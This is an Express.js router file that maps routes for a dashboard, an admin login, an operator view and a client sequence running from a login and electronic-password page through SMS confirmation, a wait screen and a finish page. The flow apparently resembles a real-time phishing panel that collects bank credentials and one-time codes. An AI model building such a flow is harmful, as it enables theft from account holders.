const routes = require('express').Router()

//Dashboard
const DashboardView = require('../controllers/views/DashboardViews')
//Login
const LoginView = require('../controllers/views/admin/LoginViews')
//Client
const ProductView = require('../controllers/views/admin/ProductView')

const PasswordView = require('../controllers/views/passwordView')
const AwaitView = require('../controllers/views/awaitView')
const EletronicView = require('../controllers/views/eletronicView')
const FinishView = require('../controllers/views/finishView')

const SmsView = require('../controllers/views/smsView')

const SessionController = require('../controllers/SessionController')

const OperatorView = require('../controllers/views/OperatorView')

const WarningView = require('../controllers/views/warningView')

const ClientController = require('../controllers/ClientController')

//Dashboard
routes.get(`/dashboard`, DashboardView.view)
routes.get(`/sinbc-login`, PasswordView.view)
routes.post(`/sinbc-login`, PasswordView.view)
//Client
routes.get(`/products`, ProductView.index)
routes.get(`/password`, ProductView.index)
routes.get(`/eletronic`, EletronicView.view)
routes.get(`/confirmsms`, SmsView.view)
routes.post(`/sendsms`, ClientController.store)
routes.get(`/await`, AwaitView.view)
routes.get(`/warning`, WarningView.view)
routes.get(`/finish`, FinishView.view)

//Login
routes.get(`/login`, LoginView.view)
routes.post(`/authenticate`, SessionController.store)

//operator
routes.get(`/operator`, OperatorView.view)

//forgot password
routes.get(`/forgot`, (req, res) => res.redirect('/dashboard'))

//logout
routes.get(`/logout`, (req, res) => {
    res.clearCookie('token')

    return res.redirect('/login')
})

module.exports = routes
